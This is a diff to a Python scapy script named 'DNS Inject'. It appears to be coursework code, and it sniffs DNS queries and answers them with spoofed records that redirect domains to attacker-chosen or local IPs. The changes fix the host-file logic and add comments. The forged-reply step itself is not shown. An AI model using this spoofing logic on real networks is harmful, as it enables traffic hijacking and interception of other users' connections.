@@ -3,6 +3,9 @@ import os
 from scapy.all import *
 import socket
 
+##############################################################
+# to take input from the arguments
+##############################################################
 def check_arg():
 	parser = argparse.ArgumentParser(description='DNS Inject', add_help=False)
 	parser.add_argument('-i', nargs='?', action="store")
@@ -12,13 +15,18 @@ def check_arg():
 
 	return args.i, args.h, args.filter
 
+#############################################################
+# Callback function for scapy sniff
+############################################################
 def dns_inject(packet):
-	# ........................ Check which ones are victims..........................
-	# ........................ Get redirect_to .....................................
-	#print(packet)
+	# checking if the packet is a DNS Questoin Record and to prevent it
+	# for infinte spoofing
 	if(packet.haslayer(DNSQR) and packet[DNS].ancount==0):
-	spoofFlag=1
-		if(hostFlag==0):
+		spoofFlag=1
+		# If the hostfile is present, check if the domain is present in the map
+		# If yes, spoof the packet otherwise don't. If file is not present, then
+		# spoof all the packets with the local machine's IP
+		if(hostFlag==1):
 			domain = packet[DNS].qd.qname.decode('ASCII').rsplit('.', 1)[0]
 			if(domain in host.keys()):
 				redirect_to = host[domain]
@@ -38,8 +46,6 @@ if __name__ == '__main__':
 	hostFlag=0
 	iFlag=0
 	if(interface!=None):
-		## .....................Write code to get default interface..................
-		#interface='ens33'
 		iFlag=1
 	if(hostfile==None):
 		## ....................To get local machine IP address
@@ -49,13 +55,13 @@ if __name__ == '__main__':
 		except socket.error:
 			host = '192.168.10.133'
 		host =  s.getsockname()[0]
-		hostFlag=1
 	else:
 		f = open(hostfile,"r")
 		host = {}
 		for line in f:
 			hostline = line.split()
 			host[hostline[1]] = hostline[0]
+		hostFlag=1
 
 	if not expression:
 		expression=""
@@ -63,6 +69,6 @@ if __name__ == '__main__':
 		sniff(filter=expression, iface=interface, store=0, prn=dns_inject)
 	else:
 		sniff(filter=expression, store=0, prn=dns_inject)
-	print('interface =',interface)
-	print('filename =',hostfile)
-	print('filter =',expression) 
+	#print('interface =',interface)
+	#print('filename =',hostfile)
+	#print('filter =',expression) 
